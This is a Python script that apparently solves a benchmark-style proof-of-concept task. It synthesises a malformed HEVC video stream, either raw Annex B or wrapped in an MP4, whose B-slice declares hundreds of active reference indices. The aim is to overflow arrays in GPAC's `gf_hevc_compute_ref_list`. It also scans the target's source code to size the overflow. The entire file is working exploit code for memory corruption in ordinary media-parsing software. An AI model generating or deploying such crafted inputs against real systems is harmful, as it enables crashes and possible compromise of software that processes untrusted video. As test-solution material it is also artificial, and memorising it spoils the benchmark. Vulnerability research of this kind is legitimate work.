import os
import re
import tarfile
import tempfile
from typing import Optional, Tuple


class _BitWriter:
    __slots__ = ("_buf", "_cur", "_nbits")

    def __init__(self):
        self._buf = bytearray()
        self._cur = 0
        self._nbits = 0

    def write_bit(self, b: int) -> None:
        self._cur = (self._cur << 1) | (1 if b else 0)
        self._nbits += 1
        if self._nbits == 8:
            self._buf.append(self._cur & 0xFF)
            self._cur = 0
            self._nbits = 0

    def write_bits(self, v: int, n: int) -> None:
        if n <= 0:
            return
        for i in range(n - 1, -1, -1):
            self.write_bit((v >> i) & 1)

    def write_ue(self, k: int) -> None:
        if k < 0:
            k = 0
        code_num = k + 1
        leading = code_num.bit_length() - 1
        for _ in range(leading):
            self.write_bit(0)
        self.write_bit(1)
        if leading:
            self.write_bits(code_num - (1 << leading), leading)

    def write_se(self, s: int) -> None:
        if s <= 0:
            k = -2 * s
        else:
            k = 2 * s - 1
        self.write_ue(k)

    def rbsp_trailing_bits(self) -> None:
        self.write_bit(1)
        while self._nbits != 0:
            self.write_bit(0)

    def get_bytes(self) -> bytes:
        if self._nbits:
            self._buf.append((self._cur << (8 - self._nbits)) & 0xFF)
            self._cur = 0
            self._nbits = 0
        return bytes(self._buf)


def _rbsp_to_ebsp(rbsp: bytes) -> bytes:
    out = bytearray()
    zcount = 0
    for b in rbsp:
        if zcount >= 2 and b <= 3:
            out.append(0x03)
            zcount = 0
        out.append(b)
        if b == 0:
            zcount += 1
        else:
            zcount = 0
    return bytes(out)


def _hevc_nal_header(nal_unit_type: int, layer_id: int = 0, tid_plus1: int = 1) -> bytes:
    b0 = ((nal_unit_type & 0x3F) << 1) | ((layer_id >> 5) & 0x01)
    b1 = ((layer_id & 0x1F) << 3) | (tid_plus1 & 0x07)
    return bytes((b0 & 0xFF, b1 & 0xFF))


def _ptl_general(bw: _BitWriter, profile_idc: int = 1, level_idc: int = 120) -> None:
    bw.write_bits(0, 2)          # general_profile_space
    bw.write_bits(0, 1)          # general_tier_flag
    bw.write_bits(profile_idc, 5)  # general_profile_idc
    bw.write_bits(0, 32)         # general_profile_compatibility_flags
    bw.write_bits(0, 1)          # general_progressive_source_flag
    bw.write_bits(0, 1)          # general_interlaced_source_flag
    bw.write_bits(0, 1)          # general_non_packed_constraint_flag
    bw.write_bits(0, 1)          # general_frame_only_constraint_flag
    bw.write_bits(0, 44)         # general_reserved_zero_44bits
    bw.write_bits(level_idc & 0xFF, 8)  # general_level_idc


def _make_vps() -> bytes:
    bw = _BitWriter()
    bw.write_bits(0, 4)   # vps_video_parameter_set_id
    bw.write_bits(1, 1)   # vps_base_layer_internal_flag
    bw.write_bits(1, 1)   # vps_base_layer_available_flag
    bw.write_bits(0, 6)   # vps_max_layers_minus1
    bw.write_bits(0, 3)   # vps_max_sub_layers_minus1
    bw.write_bits(1, 1)   # vps_temporal_id_nesting_flag
    bw.write_bits(0xFFFF, 16)  # vps_reserved_0xffff_16bits
    _ptl_general(bw, profile_idc=1, level_idc=120)  # profile_tier_level(1,0)
    bw.write_bits(0, 1)   # vps_sub_layer_ordering_info_present_flag
    bw.write_ue(0)        # vps_max_dec_pic_buffering_minus1[0]
    bw.write_ue(0)        # vps_max_num_reorder_pics[0]
    bw.write_ue(0)        # vps_max_latency_increase_plus1[0]
    bw.write_bits(0, 6)   # vps_max_layer_id
    bw.write_ue(0)        # vps_num_layer_sets_minus1
    bw.write_bits(0, 1)   # vps_timing_info_present_flag
    bw.write_bits(0, 1)   # vps_extension_flag
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _make_sps(num_neg_pics: int = 1) -> bytes:
    bw = _BitWriter()
    bw.write_bits(0, 4)   # sps_video_parameter_set_id
    bw.write_bits(0, 3)   # sps_max_sub_layers_minus1
    bw.write_bits(1, 1)   # sps_temporal_id_nesting_flag
    _ptl_general(bw, profile_idc=1, level_idc=120)  # profile_tier_level(1,0)
    bw.write_ue(0)        # sps_seq_parameter_set_id
    bw.write_ue(1)        # chroma_format_idc (4:2:0)
    bw.write_ue(16)       # pic_width_in_luma_samples
    bw.write_ue(16)       # pic_height_in_luma_samples
    bw.write_bits(0, 1)   # conformance_window_flag
    bw.write_ue(0)        # bit_depth_luma_minus8
    bw.write_ue(0)        # bit_depth_chroma_minus8
    bw.write_ue(4)        # log2_max_pic_order_cnt_lsb_minus4 -> 8 bits
    bw.write_bits(0, 1)   # sps_sub_layer_ordering_info_present_flag
    bw.write_ue(0)        # sps_max_dec_pic_buffering_minus1[0]
    bw.write_ue(0)        # sps_max_num_reorder_pics[0]
    bw.write_ue(0)        # sps_max_latency_increase_plus1[0]
    bw.write_ue(0)        # log2_min_luma_coding_block_size_minus3
    bw.write_ue(0)        # log2_diff_max_min_luma_coding_block_size
    bw.write_ue(0)        # log2_min_luma_transform_block_size_minus2
    bw.write_ue(0)        # log2_diff_max_min_luma_transform_block_size
    bw.write_ue(0)        # max_transform_hierarchy_depth_inter
    bw.write_ue(0)        # max_transform_hierarchy_depth_intra
    bw.write_bits(0, 1)   # scaling_list_enabled_flag
    bw.write_bits(0, 1)   # amp_enabled_flag
    bw.write_bits(0, 1)   # sample_adaptive_offset_enabled_flag
    bw.write_bits(0, 1)   # pcm_enabled_flag

    bw.write_ue(1)        # num_short_term_ref_pic_sets
    # st_ref_pic_set(0), inter_ref_pic_set_prediction_flag not present (idx==0 in spec); many decoders still code it as 0? GPAC likely follows spec.
    # To be conservative across implementations, explicitly write inter_ref_pic_set_prediction_flag=0 if they expect it:
    # However, spec says it's absent for idx==0. We'll not write it.

    bw.write_ue(max(0, num_neg_pics))  # num_negative_pics
    bw.write_ue(0)                     # num_positive_pics
    for _ in range(max(0, num_neg_pics)):
        bw.write_ue(0)                 # delta_poc_s0_minus1 (=> -1 each if repeated; not strictly valid but OK for fuzzing/PoC)
        bw.write_bits(1, 1)            # used_by_curr_pic_s0_flag
    bw.write_bits(0, 1)   # long_term_ref_pics_present_flag
    bw.write_bits(0, 1)   # sps_temporal_mvp_enabled_flag
    bw.write_bits(0, 1)   # strong_intra_smoothing_enabled_flag
    bw.write_bits(0, 1)   # vui_parameters_present_flag
    bw.write_bits(0, 1)   # sps_extension_flag
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _make_pps() -> bytes:
    bw = _BitWriter()
    bw.write_ue(0)        # pps_pic_parameter_set_id
    bw.write_ue(0)        # pps_seq_parameter_set_id
    bw.write_bits(0, 1)   # dependent_slice_segments_enabled_flag
    bw.write_bits(0, 1)   # output_flag_present_flag
    bw.write_bits(0, 3)   # num_extra_slice_header_bits
    bw.write_bits(0, 1)   # sign_data_hiding_enabled_flag
    bw.write_bits(0, 1)   # cabac_init_present_flag
    bw.write_ue(0)        # num_ref_idx_l0_default_active_minus1
    bw.write_ue(0)        # num_ref_idx_l1_default_active_minus1
    bw.write_se(0)        # init_qp_minus26
    bw.write_bits(0, 1)   # constrained_intra_pred_flag
    bw.write_bits(0, 1)   # transform_skip_enabled_flag
    bw.write_bits(0, 1)   # cu_qp_delta_enabled_flag
    bw.write_se(0)        # pps_cb_qp_offset
    bw.write_se(0)        # pps_cr_qp_offset
    bw.write_bits(0, 1)   # pps_slice_chroma_qp_offsets_present_flag
    bw.write_bits(0, 1)   # weighted_pred_flag
    bw.write_bits(0, 1)   # weighted_bipred_flag
    bw.write_bits(0, 1)   # transquant_bypass_enabled_flag
    bw.write_bits(0, 1)   # tiles_enabled_flag
    bw.write_bits(0, 1)   # entropy_coding_sync_enabled_flag
    bw.write_bits(0, 1)   # pps_loop_filter_across_slices_enabled_flag (set 0 to avoid extra slice header fields)
    bw.write_bits(0, 1)   # deblocking_filter_control_present_flag
    bw.write_bits(0, 1)   # pps_scaling_list_data_present_flag
    bw.write_bits(0, 1)   # lists_modification_present_flag
    bw.write_ue(0)        # log2_parallel_merge_level_minus2
    bw.write_bits(0, 1)   # slice_segment_header_extension_present_flag
    bw.write_bits(0, 1)   # pps_extension_flag
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _make_slice_idr() -> bytes:
    bw = _BitWriter()
    bw.write_bits(1, 1)   # first_slice_segment_in_pic_flag
    bw.write_bits(0, 1)   # no_output_of_prior_pics_flag (IRAP)
    bw.write_ue(0)        # slice_pic_parameter_set_id
    bw.write_ue(2)        # slice_type (I=2)
    bw.write_se(0)        # slice_qp_delta
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _make_slice_nonidr_b(num_ref_minus1: int = 200, poc_lsb: int = 1, log2_poc_bits: int = 8) -> bytes:
    bw = _BitWriter()
    bw.write_bits(1, 1)   # first_slice_segment_in_pic_flag
    bw.write_ue(0)        # slice_pic_parameter_set_id
    bw.write_ue(0)        # slice_type (B=0)
    bw.write_bits(poc_lsb & ((1 << log2_poc_bits) - 1), log2_poc_bits)  # slice_pic_order_cnt_lsb
    bw.write_bits(1, 1)   # short_term_ref_pic_set_sps_flag
    bw.write_bits(1, 1)   # num_ref_idx_active_override_flag
    bw.write_ue(max(0, num_ref_minus1))  # num_ref_idx_l0_active_minus1
    bw.write_ue(max(0, num_ref_minus1))  # num_ref_idx_l1_active_minus1
    bw.write_bits(0, 1)   # mvd_l1_zero_flag
    bw.write_ue(0)        # five_minus_max_num_merge_cand
    bw.write_se(0)        # slice_qp_delta
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _annexb_stream(vps: bytes, sps: bytes, pps: bytes, idr: bytes, bsl: bytes) -> bytes:
    def nal(nal_type: int, rbsp: bytes) -> bytes:
        ebsp = _rbsp_to_ebsp(rbsp)
        return b"\x00\x00\x00\x01" + _hevc_nal_header(nal_type) + ebsp

    out = bytearray()
    out += nal(32, vps)
    out += nal(33, sps)
    out += nal(34, pps)
    out += nal(19, idr)   # IDR_W_RADL
    out += nal(1, bsl)    # TRAIL_N / non-IDR
    return bytes(out)


def _u32(v: int) -> bytes:
    return bytes(((v >> 24) & 0xFF, (v >> 16) & 0xFF, (v >> 8) & 0xFF, v & 0xFF))


def _u16(v: int) -> bytes:
    return bytes(((v >> 8) & 0xFF, v & 0xFF))


def _box(t: bytes, payload: bytes) -> bytes:
    return _u32(8 + len(payload)) + t + payload


def _hvcc(vps_nal: bytes, sps_nal: bytes, pps_nal: bytes, length_size_minus_one: int = 3) -> bytes:
    # HEVCDecoderConfigurationRecord (ISO/IEC 14496-15)
    # Keep fields simple; many decoders accept conservative defaults.
    if length_size_minus_one < 0:
        length_size_minus_one = 0
    if length_size_minus_one > 3:
        length_size_minus_one = 3

    rec = bytearray()
    rec.append(1)  # configurationVersion

    # general_profile_space(2), general_tier_flag(1), general_profile_idc(5)
    rec.append((0 << 6) | (0 << 5) | (1 & 0x1F))
    rec += b"\x00\x00\x00\x00"  # general_profile_compatibility_flags
    rec += b"\x00\x00\x00\x00\x00\x00"  # general_constraint_indicator_flags (48 bits)
    rec.append(120)  # general_level_idc

    rec += _u16(0xF000 | 0)  # min_spatial_segmentation_idc
    rec.append(0xFC | 0)     # parallelismType
    rec.append(0xFC | 1)     # chromaFormat (1=4:2:0)
    rec.append(0xF8 | 0)     # bitDepthLumaMinus8
    rec.append(0xF8 | 0)     # bitDepthChromaMinus8
    rec += _u16(0)           # avgFrameRate
    # constantFrameRate(2)=0, numTemporalLayers(3)=0, temporalIdNested(1)=1, lengthSizeMinusOne(2)
    rec.append((0 << 6) | (0 << 3) | (1 << 2) | (length_size_minus_one & 0x03))

    arrays = bytearray()
    for nal_type, nal in ((32, vps_nal), (33, sps_nal), (34, pps_nal)):
        arrays.append((1 << 7) | (0 << 6) | (nal_type & 0x3F))  # array_completeness=1
        arrays += _u16(1)  # numNalus
        arrays += _u16(len(nal))
        arrays += nal

    rec.append(3)  # numOfArrays
    rec += arrays
    return bytes(rec)


def _mp4_with_hevc_samples(vps_rbsp: bytes, sps_rbsp: bytes, pps_rbsp: bytes, idr_rbsp: bytes, bsl_rbsp: bytes) -> bytes:
    def nal_no_startcode(nal_type: int, rbsp: bytes) -> bytes:
        return _hevc_nal_header(nal_type) + _rbsp_to_ebsp(rbsp)

    vps_nal = nal_no_startcode(32, vps_rbsp)
    sps_nal = nal_no_startcode(33, sps_rbsp)
    pps_nal = nal_no_startcode(34, pps_rbsp)
    idr_nal = nal_no_startcode(19, idr_rbsp)
    bsl_nal = nal_no_startcode(1, bsl_rbsp)

    hvcc_payload = _hvcc(vps_nal, sps_nal, pps_nal, length_size_minus_one=3)
    hvcc_box = _box(b"hvcC", hvcc_payload)

    # VisualSampleEntry 'hvc1'
    compressorname = b"\x00" * 32
    vse = bytearray()
    vse += b"\x00\x00\x00\x00\x00\x00"  # reserved
    vse += _u16(1)  # data_reference_index
    vse += _u16(0) + _u16(0)  # pre_defined, reserved
    vse += b"\x00\x00\x00\x00" * 3  # pre_defined[3]
    vse += _u16(16) + _u16(16)  # width, height
    vse += _u32(0x00480000)  # horizresolution
    vse += _u32(0x00480000)  # vertresolution
    vse += _u32(0)  # reserved
    vse += _u16(1)  # frame_count
    vse += compressorname
    vse += _u16(0x0018)  # depth
    vse += _u16(0xFFFF)  # pre_defined
    vse += hvcc_box

    stsd_payload = b"\x00\x00\x00\x00" + _u32(1) + _box(b"hvc1", bytes(vse))

    # Timing / tables for 2 samples
    stts_payload = b"\x00\x00\x00\x00" + _u32(1) + _u32(2) + _u32(1)
    stsc_payload = b"\x00\x00\x00\x00" + _u32(1) + _u32(1) + _u32(2) + _u32(1)

    def sample_payload(nals) -> bytes:
        out = bytearray()
        for n in nals:
            out += _u32(len(n))
            out += n
        return bytes(out)

    # Sample 1 includes VPS/SPS/PPS + IDR, sample 2 includes B slice only
    sample1 = sample_payload([vps_nal, sps_nal, pps_nal, idr_nal])
    sample2 = sample_payload([bsl_nal])

    stsz_payload = bytearray()
    stsz_payload += b"\x00\x00\x00\x00"  # version/flags
    stsz_payload += _u32(0)              # sample_size
    stsz_payload += _u32(2)              # sample_count
    stsz_payload += _u32(len(sample1))
    stsz_payload += _u32(len(sample2))

    # stco computed later
    stco_placeholder = b"\x00\x00\x00\x00" + _u32(1) + _u32(0)

    stbl = _box(b"stsd", stsd_payload) + _box(b"stts", stts_payload) + _box(b"stsc", stsc_payload) + _box(b"stsz", bytes(stsz_payload)) + _box(b"stco", stco_placeholder)
    stbl = _box(b"stbl", stbl)

    dref = _box(b"dref", b"\x00\x00\x00\x00" + _u32(1) + _box(b"url ", b"\x00\x00\x00\x01"))
    dinf = _box(b"dinf", dref)
    vmhd = _box(b"vmhd", b"\x00\x00\x00\x01" + _u16(0) + _u16(0) + _u16(0) + _u16(0))
    minf = _box(b"minf", vmhd + dinf + stbl)

    hdlr = _box(b"hdlr", b"\x00\x00\x00\x00" + _u32(0) + b"vide" + _u32(0) + _u32(0) + _u32(0) + b"VideoHandler\x00")
    mdhd = _box(b"mdhd", b"\x00\x00\x00\x00" + _u32(0) + _u32(0) + _u32(1000) + _u32(2) + _u16(0x55C4) + _u16(0))
    mdia = _box(b"mdia", mdhd + hdlr + minf)

    tkhd = _box(
        b"tkhd",
        b"\x00\x00\x00\x07" + _u32(0) + _u32(0) + _u32(1) + _u32(0) + _u32(2) +
        _u32(0) + _u32(0) + _u16(0) + _u16(0) + _u16(0) + _u16(0) +
        _u32(0x00010000) + _u32(0) + _u32(0) +
        _u32(0) + _u32(0x00010000) + _u32(0) +
        _u32(0) + _u32(0) + _u32(0x40000000) +
        _u32(16 << 16) + _u32(16 << 16)
    )

    trak = _box(b"trak", tkhd + mdia)

    mvhd = _box(
        b"mvhd",
        b"\x00\x00\x00\x00" + _u32(0) + _u32(0) + _u32(1000) + _u32(2) +
        _u32(0x00010000) + _u16(0) + _u16(0) + _u32(0) + _u32(0) +
        _u32(0x00010000) + _u32(0) + _u32(0) +
        _u32(0) + _u32(0x00010000) + _u32(0) +
        _u32(0) + _u32(0) + _u32(0x40000000) +
        b"\x00" * 24 + _u32(2)
    )

    moov = _box(b"moov", mvhd + trak)

    ftyp = _box(b"ftyp", b"isom" + _u32(0) + b"isom" + b"iso6" + b"mp41" + b"hvc1")

    mdat_payload = sample1 + sample2
    mdat = _box(b"mdat", mdat_payload)

    # Patch stco chunk offset: ftyp + moov + mdat header (8 bytes)
    chunk_offset = len(ftyp) + len(moov) + 8

    # Replace stco placeholder
    stco_real = _box(b"stco", b"\x00\x00\x00\x00" + _u32(1) + _u32(chunk_offset))

    # Rebuild moov with patched stco
    stbl_patched = _box(b"stsd", stsd_payload) + _box(b"stts", stts_payload) + _box(b"stsc", stsc_payload) + _box(b"stsz", bytes(stsz_payload)) + stco_real
    stbl_patched = _box(b"stbl", stbl_patched)
    minf_patched = _box(b"minf", vmhd + dinf + stbl_patched)
    mdia_patched = _box(b"mdia", mdhd + hdlr + minf_patched)
    trak_patched = _box(b"trak", tkhd + mdia_patched)
    moov_patched = _box(b"moov", mvhd + trak_patched)

    return ftyp + moov_patched + mdat


def _detect_prefers_mp4(src_path: str) -> bool:
    # Heuristic: if fuzz harness explicitly uses gf_isom (MP4/ISOBMFF), prefer MP4.
    hay = bytearray()

    def add_text(b: bytes) -> None:
        nonlocal hay
        if len(hay) > 4_000_000:
            return
        hay += b[:200_000]

    def scan_text(text: bytes) -> bool:
        t = text.lower()
        if b"llvmfuzzertestoneinput" not in t and b"honggfuzz" not in t and b"fuzz" not in t:
            return False
        if b"gf_isom" in t or b"isom" in t and (b"open" in t or b"gf_" in t):
            return True
        if b".mp4" in t or b"ftyp" in t or b"moov" in t:
            return True
        return False

    try:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    lfn = fn.lower()
                    if not (lfn.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".m"))):
                        continue
                    p = os.path.join(root, fn)
                    if os.path.getsize(p) > 2_000_000:
                        continue
                    with open(p, "rb") as f:
                        data = f.read(250_000)
                    if scan_text(data):
                        return True
            return False

        if tarfile.is_tarfile(src_path):
            with tarfile.open(src_path, "r:*") as tf:
                members = tf.getmembers()
                # prioritize likely fuzz targets
                members.sort(key=lambda m: (0 if ("fuzz" in m.name.lower() or "oss-fuzz" in m.name.lower()) else 1, m.size))
                for m in members:
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if not name.endswith((".c", ".cc", ".cpp", ".h", ".hpp")):
                        continue
                    if m.size > 2_000_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if not f:
                            continue
                        data = f.read(250_000)
                    except Exception:
                        continue
                    if scan_text(data):
                        return True
            return False
    except Exception:
        return False


def _extract_compute_ref_list_hints(src_path: str) -> Tuple[bool, int]:
    # Optional hinting: if we can find small fixed array sizes in gf_hevc_compute_ref_list,
    # choose a num_ref large enough. Fallback: 200.
    default_num_ref_minus1 = 200
    wants_large_num_ref = True

    def analyze_text(t: str) -> int:
        # Look for local array sizes like [16], [32] inside the function and pick > max.
        sizes = []
        for s in re.findall(r"\[(\d{1,4})\]", t):
            try:
                v = int(s)
                if 0 < v <= 2048:
                    sizes.append(v)
            except Exception:
                pass
        if not sizes:
            return default_num_ref_minus1
        mx = max(sizes)
        # choose 2*mx to exceed
        target = min(1500, max(64, 2 * mx))
        return target

    try:
        code_bytes = b""
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if "hevc" not in fn.lower():
                        continue
                    if not fn.lower().endswith((".c", ".cc", ".cpp", ".h", ".hpp")):
                        continue
                    p = os.path.join(root, fn)
                    if os.path.getsize(p) > 5_000_000:
                        continue
                    with open(p, "rb") as f:
                        b = f.read()
                    if b"gf_hevc_compute_ref_list" in b:
                        code_bytes = b
                        break
        else:
            if tarfile.is_tarfile(src_path):
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        name = m.name.lower()
                        if "hevc" not in name:
                            continue
                        if not name.endswith((".c", ".cc", ".cpp", ".h", ".hpp")):
                            continue
                        if m.size > 5_000_000:
                            continue
                        f = tf.extractfile(m)
                        if not f:
                            continue
                        b = f.read()
                        if b"gf_hevc_compute_ref_list" in b:
                            code_bytes = b
                            break
        if not code_bytes:
            return wants_large_num_ref, default_num_ref_minus1
        t = code_bytes.decode("utf-8", errors="ignore")
        idx = t.find("gf_hevc_compute_ref_list")
        if idx < 0:
            return wants_large_num_ref, default_num_ref_minus1

        # extract a chunk around it (brace matching, best-effort)
        start = t.rfind("\n", 0, idx)
        if start < 0:
            start = idx
        chunk = t[idx:idx + 20000]
        num_ref = analyze_text(chunk)
        # if function doesn't mention num_ref_idx, still return something large
        if "num_ref_idx" not in chunk and "ref_idx" not in chunk:
            wants_large_num_ref = True
        return wants_large_num_ref, max(64, min(1500, num_ref))
    except Exception:
        return wants_large_num_ref, default_num_ref_minus1


class Solution:
    def solve(self, src_path: str) -> bytes:
        prefers_mp4 = _detect_prefers_mp4(src_path)
        _, num_ref_minus1 = _extract_compute_ref_list_hints(src_path)

        vps = _make_vps()
        # Keep SPS RPS small (1) to avoid triggering unrelated crashes in parsing.
        sps = _make_sps(num_neg_pics=1)
        pps = _make_pps()
        idr = _make_slice_idr()
        bsl = _make_slice_nonidr_b(num_ref_minus1=num_ref_minus1, poc_lsb=1, log2_poc_bits=8)

        if prefers_mp4:
            return _mp4_with_hevc_samples(vps, sps, pps, idr, bsl)
        return _annexb_stream(vps, sps, pps, idr, bsl)